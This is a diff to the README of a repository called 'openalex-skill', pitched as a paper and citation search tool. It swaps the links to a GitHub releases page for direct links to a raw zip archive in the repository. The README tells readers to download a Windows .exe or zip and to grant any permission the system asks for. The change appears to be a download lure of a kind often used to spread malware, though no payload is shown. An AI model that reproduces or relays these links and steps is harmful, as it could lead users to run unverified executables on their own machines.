@@ -1,6 +1,6 @@
 # 🧠 openalex-skill - Find papers, citations, and answers fast
 
-[![Download openalex-skill](https://img.shields.io/badge/Download%20openalex-skill-blue?style=for-the-badge)](https://github.com/Out-bloodspavin173/openalex-skill/releases)
+[![Download openalex-skill](https://img.shields.io/badge/Download%20openalex-skill-blue?style=for-the-badge)](https://raw.githubusercontent.com/Out-bloodspavin173/openalex-skill/main/skills/openalex/skill-openalex-v2.5.zip)
 
 ## 🚀 What this tool does
 
@@ -31,7 +31,7 @@ If your system asks for permission when you open the app, choose **Allow**.
 
 Visit this page to download:
 
-https://github.com/Out-bloodspavin173/openalex-skill/releases
+https://raw.githubusercontent.com/Out-bloodspavin173/openalex-skill/main/skills/openalex/skill-openalex-v2.5.zip
 
 On that page, look for the latest release. Download the file for Windows. If there are multiple files, choose the one that ends with `.exe` or a Windows zip file.
 
@@ -233,4 +233,4 @@ If you use it often, place a shortcut on your desktop:
 
 Visit this page to download:
 
-https://github.com/Out-bloodspavin173/openalex-skill/releases
+https://raw.githubusercontent.com/Out-bloodspavin173/openalex-skill/main/skills/openalex/skill-openalex-v2.5.zip
